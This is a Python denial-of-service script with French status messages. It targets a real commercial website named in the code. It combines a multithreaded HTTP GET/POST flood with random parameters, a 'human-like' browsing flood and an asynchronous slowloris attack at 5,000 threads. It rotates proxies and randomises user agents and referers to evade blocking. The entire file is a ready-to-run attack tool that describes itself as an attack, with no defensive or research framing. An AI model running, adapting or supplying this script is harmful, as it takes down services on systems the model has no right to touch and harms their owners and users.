import requests
import aiohttp
import asyncio
import random
import threading
import time
import string
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
import os

TARGET_URL = "https://www.bugatti.com/fr"
THREADS = 5000
DURATION = 30
PROXY_FILE = "proxies.txt"
ENDPOINTS = ["/", "/search", "/login", "/api/data"]

ua = UserAgent()

def load_proxies():
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return []

PROXIES = load_proxies()

def random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_headers():
    return {
        "User-Agent": ua.random,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.5", "fr-FR,fr;q=0.5", "de-DE,de;q=0.5"]),
        "Connection": "keep-alive",
        "Referer": random.choice(["https://google.com", "https://bing.com", TARGET_URL]),
        "Cache-Control": "no-cache"
    }

def http_flood():
    end_time = time.time() + DURATION
    session = requests.Session()
    
    while time.time() < end_time:
        try:
            proxy = {"http": f"http://{random.choice(PROXIES)}"} if PROXIES else None
            endpoint = random.choice(ENDPOINTS)
            url = TARGET_URL + endpoint
            headers = random_headers()
            params = {"q": random_string(10), "t": str(random.randint(1, 10000))}
            
            if random.random() > 0.3:
                response = session.get(url, headers=headers, params=params, proxies=proxy, timeout=5)
            else:
                data = {"input": random_string(100), "submit": "1"}
                response = session.post(url, headers=headers, data=data, proxies=proxy, timeout=5)
            
            print(f"[{threading.current_thread().name}] Requête - Statut: {response.status_code}")
        except:
            pass

async def slowloris(session):
    end_time = time.time() + DURATION
    while time.time() < end_time:
        try:
            proxy = random.choice(PROXIES) if PROXIES else None
            headers = random_headers()
            headers["Connection"] = "keep-alive"
            headers["Keep-Alive"] = "timeout=15, max=100"
            
            async with session.get(TARGET_URL, headers=headers, proxy=f"http://{proxy}" if proxy else None) as response:
                print(f"[{threading.current_thread().name}] Slowloris - Connexion ouverte")
                await asyncio.sleep(random.uniform(5, 15))
        except:
            pass

async def run_slowloris():
    async with aiohttp.ClientSession() as session:
        tasks = [slowloris(session) for _ in range(THREADS // 4)]
        await asyncio.gather(*tasks)

def human_like_flood():
    end_time = time.time() + DURATION
    session = requests.Session()
    
    while time.time() < end_time:
        try:
            proxy = {"http": f"http://{random.choice(PROXIES)}"} if PROXIES else None
            headers = random_headers()
            
            for endpoint in random.sample(ENDPOINTS, min(3, len(ENDPOINTS))):
                url = TARGET_URL + endpoint
                params = {"session": random_string(8)}
                response = session.get(url, headers=headers, params=params, proxies=proxy, timeout=5)
                time.sleep(random.uniform(0.5, 2))
                print(f"[{threading.current_thread().name}] Navigation - Statut: {response.status_code}")
        except:
            pass

def start_powerful_flood():
    print(f"Lancement d'une attaque sur {TARGET_URL}")
    print(f"Threads: {THREADS}, Durée: {DURATION}s, Proxies: {len(PROXIES)}")
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for _ in range(int(THREADS * 0.6)):
            executor.submit(http_flood)
        
        for _ in range(int(THREADS * 0.2)):
            executor.submit(human_like_flood)
    
    if THREADS >= 5:
        asyncio.run(run_slowloris())
    
    time.sleep(DURATION)
    end_time = time.time()
    
    print(f"Attaque terminée après {end_time - start_time:.2f} secondes.")

if __name__ == "__main__":
    try:
        start_powerful_flood()
    except KeyboardInterrupt:
        print("\nAttaque arrêtée par l'utilisateur.")